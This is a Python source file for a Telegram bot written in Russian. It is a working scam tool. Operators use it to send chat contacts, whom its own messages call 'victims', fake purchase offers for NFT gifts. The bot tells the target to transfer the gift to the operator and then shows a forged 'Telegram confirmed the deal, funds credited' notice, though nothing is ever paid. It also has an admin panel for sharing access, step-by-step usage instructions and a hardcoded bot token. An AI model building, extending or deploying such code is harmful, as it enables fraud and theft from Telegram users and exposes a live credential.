# language: python, file: bot.py, runtime: Python 3.11+, Pydroid 3
# pip install aiogram==3.15.0

import asyncio
import re
import logging
import random
import string
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    InlineQuery, InlineQueryResultArticle, InputTextMessageContent
)
from aiogram.fsm.storage.memory import MemoryStorage

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "8676518589:AAHBFP3QEfs9YKJKWxMkwWR-10Zz9Wu8TnQ"
BOT_USERNAME = "offers_telegramb_bot" 
# =============================================

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("bot")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

# --- БАЗЫ ДАННЫХ (В ПАМЯТИ) ---
OFFERS_DB = {}
ADMINS = {8821691367: "semerat"} 
USERS = {} 

# Регулярка: теперь https:// НЕ обязателен
OFFER_PATTERN = re.compile(
    r"(?:https?://)?t\.me/nft/([\w\-]+)\s+(\d+)\s+(звёзд[а-я]*|гр[а-я]+|gram[s]?)\s+(\d+h)",
    re.IGNORECASE
)

def is_admin(user_id):
    return user_id in ADMINS

def parse_currency(word: str) -> str:
    return "⭐" if word.lower().startswith("звёзд") else "💎"

def format_time(delta: timedelta) -> str:
    total_seconds = int(delta.total_seconds())
    return f"{total_seconds // 3600} ч. {(total_seconds % 3600) // 60} мин."

def gen_deal_id():
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))

def get_admin_username():
    return list(ADMINS.values())[0] if ADMINS else "admin"

def make_offer_text(amount, currency, nft_name, hours):
    # nft_name теперь это чистое имя (XmasStocking-75505)
    formatted_name = nft_name.replace("-", " #")
    return (
        f"🎁 <b>Вам поступило предложение!</b>\n\n"
        f"Пользователь <b>@{get_admin_username()}</b> предлагает <b>{amount} {currency}</b> "
        f"за ваш подарок <b>{formatted_name}</b>.\n\n"
        f"<a href='https://t.me/nft/{nft_name}'>Посмотреть подарок</a>\n\n"
        f"Предложение действует ещё {format_time(timedelta(hours=hours))}."
    )

# ================= ИНЛАЙН РЕЖИМ =================
@router.inline_query()
async def inline_handler(query: InlineQuery):
    if not is_admin(query.from_user.id):
        await query.answer([], cache_time=1, is_personal=True)
        return

    match = OFFER_PATTERN.search(query.query)
    if not match:
        result = InlineQueryResultArticle(
            id="help",
            title="Создать оффер",
            description="Введи: ссылка сумма валюта время",
            input_message_content=InputTextMessageContent(
                message_text="❌ Формат:\n<code>t.me/nft/Имя-123 500 звёзд 24h</code>\nПример:\n<code>t.me/nft/XmasStocking-75505 500 звёзд 24h</code>"
            )
        )
        await query.answer([result], cache_time=1, is_personal=True)
        return

    nft_name = match.group(1) # Чистое имя, например XmasStocking-75505
    amount = match.group(2)
    currency = parse_currency(match.group(3))
    hours = int(match.group(4)[:-1])
    
    deal_id = gen_deal_id()
    OFFERS_DB[deal_id] = {
        "amount": amount,
        "currency": currency,
        "nft_name": nft_name,
        "hours": hours,
        "admin_id": query.from_user.id,
        "status": "pending"
    }

    text = make_offer_text(amount, currency, nft_name, hours)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="❌ Отклонить", callback_data="reject"),
            InlineKeyboardButton(text="✅ Принять", callback_data=f"acc:{deal_id}")
        ]
    ])

    result = InlineQueryResultArticle(
        id=deal_id,
        title="Отправить оффер",
        description=f"{amount} {currency} за {nft_name}",
        input_message_content=InputTextMessageContent(
            message_text=text,
            disable_web_page_preview=True
        ),
        reply_markup=kb
    )
    
    await query.answer([result], cache_time=1, is_personal=True)

# ================= ОБРАБОТКА ОФФЕРОВ =================
@router.callback_query(F.data.startswith("acc:"))
async def accept_offer(call: CallbackQuery):
    deal_id = call.data.split(":")[1]
    offer = OFFERS_DB.get(deal_id)
    
    if not offer:
        await call.answer("❌ Оффер устарел или не найден.", show_alert=True)
        return
        
    amount = offer["amount"]
    currency = offer["currency"]
    nft_name = offer["nft_name"]
    admin_user = get_admin_username()
    
    formatted_name = nft_name.replace("-", " ").title()
    nft_link = f"https://t.me/nft/{nft_name}"

    text = (
        f"✅ <b>Оффер принят</b>\n\n"
        f"🎁 Передайте подарок нажмите мой.\n"
        f"Затем нажмите «Подтвердить передачу».\n"
        f"Кнопка сработает только если подарок уже у получателя.\n\n"
        f"<b>{amount} {currency}</b> за подарок <a href='{nft_link}'>{formatted_name}</a>.\n\n"
        f"Оффер #{deal_id},\n"
        f"получатель @{admin_user}"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📦 Передать", url=f"tg://send_gift?to={admin_user}")],
        [InlineKeyboardButton(text="✅ Готово", callback_data=f"don:{deal_id}")]
    ])

    await call.bot.edit_message_text(
        text=text,
        inline_message_id=call.inline_message_id,
        reply_markup=kb,
        disable_web_page_preview=True
    )
    await call.answer()

@router.callback_query(F.data == "reject")
async def reject_offer(call: CallbackQuery):
    await call.bot.edit_message_text(
        text="❌ <b>Оффер отклонен.</b>",
        inline_message_id=call.inline_message_id
    )
    await call.answer()

@router.callback_query(F.data.startswith("don:"))
async def confirm_transfer(call: CallbackQuery):
    deal_id = call.data.split(":")[1]
    offer = OFFERS_DB.get(deal_id)
    
    if not offer:
        await call.answer("❌ Оффер не найден.", show_alert=True)
        return

    user = call.from_user
    offer["user_id"] = user.id
    offer["username"] = user.username
    offer["inline_message_id"] = call.inline_message_id
    offer["status"] = "checking"
    
    await call.bot.edit_message_text(
        text="🔄 <b>Идёт проверка...</b>\n\nTelegram проверяет наличие переданного подарка. Пожалуйста, подождите.",
        inline_message_id=call.inline_message_id
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Да (получил)", callback_data=f"chk_yes:{deal_id}"),
            InlineKeyboardButton(text="❌ Нет (не получил)", callback_data=f"chk_no:{deal_id}")
        ]
    ])

    try:
        await bot.send_message(
            offer["admin_id"],
            f"🔥 <b>ЗАПРОС НА ПРОВЕРКУ!</b>\n\n"
            f"Жертва нажала «Готово».\n\n"
            f"Имя: @{user.username or 'нет'}\n"
            f"ID: <code>{user.id}</code>\n"
            f"Оффер: {deal_id}\n"
            f"Сумма: {offer['amount']} {offer['currency']}\n\n"
            f"<b>Ты получил NFT подарок?</b>",
            reply_markup=kb
        )
    except Exception as e:
        log.error(f"Ошибка отправки админу {offer['admin_id']}: {e}")
        
    await call.answer()

@router.callback_query(F.data.startswith("chk_yes:"))
async def check_yes(call: CallbackQuery):
    deal_id = call.data.split(":")[1]
    offer = OFFERS_DB.get(deal_id)
    
    if not offer:
        await call.answer("❌ Оффер не найден.", show_alert=True)
        return

    await call.bot.edit_message_text(
        text=(
            f"✅ <b>Подарок успешно получен!</b>\n\n"
            f"Оффер: {deal_id}\n"
            f"Telegram зафиксировал сделку.\n"
            f"На ваш баланс зачислено <b>{offer['amount']} {offer['currency']}</b>.\n\n"
            f"<i>Средства поступят в течение 5–10 минут.</i>"
        ),
        inline_message_id=offer["inline_message_id"]
    )
    
    await call.message.edit_text(
        f"✅ <b>Подтверждено!</b>\nОффер: {deal_id}\nПользователь: @{offer.get('username') or 'нет'}\n\nЖертве отправлено уведомление об успехе."
    )
    await call.answer("Успех отправлен.")

@router.callback_query(F.data.startswith("chk_no:"))
async def check_no(call: CallbackQuery):
    deal_id = call.data.split(":")[1]
    offer = OFFERS_DB.get(deal_id)
    
    if not offer:
        await call.answer("❌ Оффер не найден.", show_alert=True)
        return

    await call.bot.edit_message_text(
        text=(
            f"❌ <b>Вы не отправили NFT подарок.</b>\n\n"
            f"Оффер #{deal_id} отменён.\n"
            f"Если вы считаете, что произошла ошибка, свяжитесь с поддержкой: @{get_admin_username()}"
        ),
        inline_message_id=offer["inline_message_id"]
    )
    
    await call.message.edit_text(
        f"❌ <b>Отклонено (подарок не получен).</b>\nОффер: {deal_id}\nПользователь: @{offer.get('username') or 'нет'}"
    )
    await call.answer("Жертва уведомлена.")

# ================= ПАНЕЛЬ АДМИНА (/admin) =================
@router.message(Command("admin"))
async def cmd_admin(msg: Message):
    if not is_admin(msg.from_user.id):
        await msg.answer("⛔ <b>Доступ запрещен.</b>")
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 Пользователи (нажали /start)", callback_data="show_users")],
        [InlineKeyboardButton(text="➕ Выдать доступ", callback_data="grant_access_help")],
        [InlineKeyboardButton(text="➖ Забрать доступ", callback_data="revoke_access_help")]
    ])

    await msg.answer(
        "🛠 <b>Админ-панель</b>\n\n"
        "Здесь ты можешь управлять доступами к боту.",
        reply_markup=kb
    )

@router.callback_query(F.data == "show_users")
async def show_users(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    
    if not USERS:
        await call.message.edit_text("Список пуст. Никто еще не нажимал /start.")
        return

    text = "👥 <b>Список пользователей:</b>\n\n"
    for uid, uname in USERS.items():
        role = "👑 Админ" if uid in ADMINS else "👤 Юзер"
        text += f"{role} | @{uname or 'скрыт'} (<code>{uid}</code>)\n"
    
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_admin")]])
    await call.message.edit_text(text, reply_markup=kb)

@router.callback_query(F.data == "grant_access_help")
async def grant_help(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    await call.message.edit_text(
        "Чтобы выдать доступ, отправь команду:\n"
        "<code>/add_admin ID_или_юзернейм</code>\n\n"
        "Пример: <code>/add_admin 12345678</code> или <code>/add_admin @username</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_admin")]])
    )

@router.callback_query(F.data == "revoke_access_help")
async def revoke_help(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    await call.message.edit_text(
        "Чтобы забрать доступ, отправь команду:\n"
        "<code>/del_admin ID_или_юзернейм</code>\n\n"
        "Пример: <code>/del_admin 12345678</code> или <code>/del_admin @username</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_admin")]])
    )

@router.callback_query(F.data == "back_to_admin")
async def back_to_admin(call: CallbackQuery):
    if not is_admin(call.from_user.id): return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 Пользователи (нажали /start)", callback_data="show_users")],
        [InlineKeyboardButton(text="➕ Выдать доступ", callback_data="grant_access_help")],
        [InlineKeyboardButton(text="➖ Забрать доступ", callback_data="revoke_access_help")]
    ])
    await call.message.edit_text("🛠 <b>Админ-панель</b>", reply_markup=kb)


# ================= КОМАНДЫ УПРАВЛЕНИЯ ДОСТУПОМ =================
@router.message(Command("add_admin"))
async def add_admin(msg: Message):
    if not is_admin(msg.from_user.id): return
    
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        await msg.answer("❌ Формат: <code>/add_admin ID_или_@username</code>")
        return
    
    target = args[1].strip()
    
    if target.startswith("@"):
        target_uname = target[1:].lower()
        found_id = next((uid for uid, uname in USERS.items() if uname and uname.lower() == target_uname), None)
        if not found_id:
            await msg.answer("❌ Пользователь с таким юзернеймом не найден в базе (он должен нажать /start).")
            return
        uid = found_id
    else:
        try:
            uid = int(target)
        except ValueError:
            await msg.answer("❌ Неверный формат ID.")
            return

    ADMINS[uid] = USERS.get(uid, "unknown")
    await msg.answer(f"✅ Пользователь <code>{uid}</code> (@{ADMINS[uid]}) получил права администратора.")

@router.message(Command("del_admin"))
async def del_admin(msg: Message):
    if not is_admin(msg.from_user.id): return
    
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        await msg.answer("❌ Формат: <code>/del_admin ID_или_@username</code>")
        return
    
    target = args[1].strip()
    
    if target.startswith("@"):
        target_uname = target[1:].lower()
        found_id = next((uid for uid, uname in ADMINS.items() if uname and uname.lower() == target_uname), None)
        if not found_id:
            await msg.answer("❌ Админ с таким юзернеймом не найден.")
            return
        uid = found_id
    else:
        try:
            uid = int(target)
        except ValueError:
            await msg.answer("❌ Неверный формат ID.")
            return

    if uid == 8821691367:
        await msg.answer("❌ Нельзя забрать доступ у главного владельца.")
        return

    if uid in ADMINS:
        del ADMINS[uid]
        await msg.answer(f"✅ Права администратора у <code>{uid}</code> отозваны.")
    else:
        await msg.answer("❌ Этот пользователь не является админом.")


# ================= /START =================
@router.message(CommandStart())
async def cmd_start(msg: Message):
    USERS[msg.from_user.id] = msg.from_user.username or msg.from_user.first_name

    if not is_admin(msg.from_user.id):
        await msg.answer("⛔ <b>Доступ запрещен.</b>\n\nЭтот бот является приватным. Вы были добавлены в список ожидания.")
        return

    await msg.answer(
        "👋 <b>Бот готов!</b>\n\n"
        f"1. В чате жертвы напиши: <code>@{BOT_USERNAME} t.me/nft/Имя-123 500 звёзд 24h</code>\n"
        "2. Отправь появившийся оффер.\n"
        "3. Когда жертва нажмёт «Готово», тебе придет запрос на проверку с кнопками Да/Нет.\n\n"
        "Управление доступами: /admin"
    )

# ================= ЗАПУСК =================
async def main():
    log.info("бот запускается погоди немного! by @semerat")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
